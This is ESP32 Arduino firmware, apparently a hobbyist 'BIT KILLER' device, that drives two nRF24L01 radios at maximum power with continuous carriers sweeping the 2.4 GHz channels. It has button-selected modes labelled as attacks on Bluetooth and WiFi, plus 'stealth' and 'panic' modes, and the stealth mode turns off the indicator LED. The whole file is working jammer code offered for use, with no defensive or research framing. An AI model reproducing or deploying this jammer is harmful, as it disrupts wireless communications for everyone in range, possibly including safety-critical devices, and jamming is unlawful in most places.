#include <RF24.h>
#include <SPI.h>
#include <nRF24L01.h>
#include <esp_bt.h>
#include <esp_wifi.h>

#define CE_A 16
#define CSN_A 15
#define CE_B 22
#define CSN_B 21
#define LED_PIN 27
#define BOOT_BUTTON 0

RF24 radioWIFI(CE_A, CSN_A, 20000000); 
RF24 radioBLE(CE_B, CSN_B, 20000000);

enum Mode { REPOSO = 0, MODO_BLE = 1, MODO_WIFI = 2, SIGILO = 3, PANICO = 4 };
volatile Mode currentMode = REPOSO;
Mode lastMode = REPOSO;
bool hspi_ok = false, vspi_ok = false;
bool last_hspi = false, last_vspi = false;
bool power_alert = false;

void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  pinMode(BOOT_BUTTON, INPUT_PULLUP);

  esp_wifi_stop(); 
  esp_bt_controller_disable();

  SPIClass *hspi = new SPIClass(HSPI);
  SPIClass *vspi = new SPIClass(VSPI);
  hspi->begin(14, 12, 13, 15); 
  vspi->begin(18, 19, 23, 21); 

  hspi_ok = radioWIFI.begin(hspi);
  vspi_ok = radioBLE.begin(vspi);

  if(hspi_ok) setupRadio(radioWIFI);
  if(vspi_ok) setupRadio(radioBLE);

  refreshUI(); 
}

void setupRadio(RF24 &r) {
  r.setAutoAck(false);
  r.setPALevel(RF24_PA_MAX, true); 
  r.setDataRate(RF24_2MBPS);      
  r.setCRCLength(RF24_CRC_DISABLED);
  r.stopListening();
}

void refreshUI() {
  for (int i = 0; i < 35; i++) Serial.println(); 

/*
  Serial.println(F(" +-------------------------------------------------------+"));
  Serial.println(F(" |  ____  _____   _    ____  _     _   _  __  __         |"));
  Serial.println(F(" | / ___||_   _| / \\  |  _ \\| |   | | | | \\ \\/ /         |"));
  Serial.println(F(" | \\___ \\  | |  / _ \\ | |_) | |   | | | |  \\  /          |"));
  Serial.println(F(" |  ___) | | | / ___ \\|  _ <| |___| |_| |  /  \\          |"));
  Serial.println(F(" | |____/  |_|/_/   \\_\\_| \\_\\_____|\\___/  /_/\\_\\         |"));

*/
  Serial.println(F(" +-------------------------------------------------------+"));
  Serial.println(F(" |  ____  ___ _____   _  _____ _     _     _____ ____    |"));
  Serial.println(F(" | | __ )|_ _|_   _| | |/ /_ _| |   | |   | ____|  _ \\   |"));
  Serial.println(F(" | |  _ \\ | |  | |   | ' / | || |   | |   |  _| | |_) |  |"));
  Serial.println(F(" | | |_) || |  | |   | . \\ | || |___| |___| |___|  _ <   |"));
  Serial.println(F(" | |____/|___| |_|   |_|\\_\\___|_____|_____|_____|_| \\_\\  |"));
  Serial.println(F(" |                                                       |"));
  
  Serial.println(F(" |            S Y S T E M    B Y    S T A R L U X        |"));
  Serial.println(F(" +-------------------------------------------------------+"));
  Serial.print(F(" [ ESTADO ]: "));
  switch(currentMode) {
    case REPOSO:    Serial.println(F("REPOSO (STANDBY)                            |")); break;
    case MODO_BLE:  Serial.println(F("ATAQUE BAFLE (BLE 2.4 GH)                   |")); break;
    case MODO_WIFI: Serial.println(F("ATAQUE REDES (WIFI 2.4 GH)                  |")); break;
    case SIGILO:    Serial.println(F("SIGILO (INVISIBLE)                          |")); break;
    case PANICO:    Serial.println(F("PANICO (OVERKILL)                           |")); break;
  }
  Serial.println(F(" +-------------------------------------------------------+"));
  Serial.print(F(" [ HSPI ]: ")); Serial.print(hspi_ok ? "ONLINE   " : "OFFLINE  ");
  Serial.print(F(" | [ VSPI ]: ")); Serial.println(vspi_ok ? "ONLINE   |" : "OFFLINE  |");
  Serial.println(F(" +-------------------------------------------------------+"));

  // APARTADO DINÁMICO DE PREVENCIÓN DE ALIMENTACIÓN
  if (power_alert) {
    Serial.println(F(" | ! ADVERTENCIA: TENSIÓN INSUFICIENTE DETECTADA         |"));
    Serial.println(F(" | ! CAÍDA DE VOLTAJE: DESCONECTA UN NRF PARA ESTABILIDAD|"));
    Serial.println(F(" +-------------------------------------------------------+"));
  } else {
    Serial.println(F(" [!] SISTEMA OPERANDO NORMALMENTE                        "));
    Serial.println(F(" +-------------------------------------------------------+"));
  }
}

void loop() {
  handleButton();
  
  static unsigned long lastCheck = 0;
  if (millis() - lastCheck > 1000) { 
    hspi_ok = radioWIFI.isChipConnected();
    vspi_ok = radioBLE.isChipConnected();
    
    // Si un módulo se cae mientras debería estar activo, activamos alerta
    power_alert = (!hspi_ok || !vspi_ok);

    if (currentMode != lastMode || hspi_ok != last_hspi || vspi_ok != last_vspi) {
      refreshUI();
      lastMode = currentMode;
      last_hspi = hspi_ok;
      last_vspi = vspi_ok;
    }
    lastCheck = millis();
  }

  // EJECUCIÓN DE FUERZA BRUTA
  if (currentMode == MODO_BLE && vspi_ok) {
    for (uint8_t i = 1; i < 80; i++) {
      radioBLE.setChannel(i);
      radioBLE.startConstCarrier(RF24_PA_MAX, i);
    }
  } 
  else if (currentMode == MODO_WIFI && hspi_ok) {
    for (uint8_t i = 1; i < 83; i++) {
      radioWIFI.setChannel(i);
      radioWIFI.startConstCarrier(RF24_PA_MAX, i);
    }
  }
  else if (currentMode == PANICO || currentMode == SIGILO) {
    for (uint8_t i = 1; i < 81; i++) {
       if(hspi_ok) { radioWIFI.setChannel(i); radioWIFI.startConstCarrier(RF24_PA_MAX, i); }
       if(vspi_ok) { radioBLE.setChannel(81-i); radioBLE.startConstCarrier(RF24_PA_MAX, 81-i); }
    }
  }
  updateLED();
}

void handleButton() {
  static bool lastBtn = HIGH;
  static unsigned long pTime = 0;
  bool btn = digitalRead(BOOT_BUTTON);
  if (lastBtn == HIGH && btn == LOW) pTime = millis();
  if (lastBtn == LOW && btn == HIGH) {
    if (millis() - pTime >= 3000) currentMode = REPOSO;
    else {
      currentMode = (Mode)((int)currentMode + 1);
      if ((int)currentMode > 4) currentMode = REPOSO;
    }
  }
  lastBtn = btn;
}

void updateLED() {
  if (currentMode == REPOSO || currentMode == SIGILO) digitalWrite(LED_PIN, LOW);
  else if (currentMode == PANICO) digitalWrite(LED_PIN, (millis() / 50) % 2);
  else digitalWrite(LED_PIN, (millis() / (currentMode == MODO_BLE ? 1000 : 200)) % 2);
}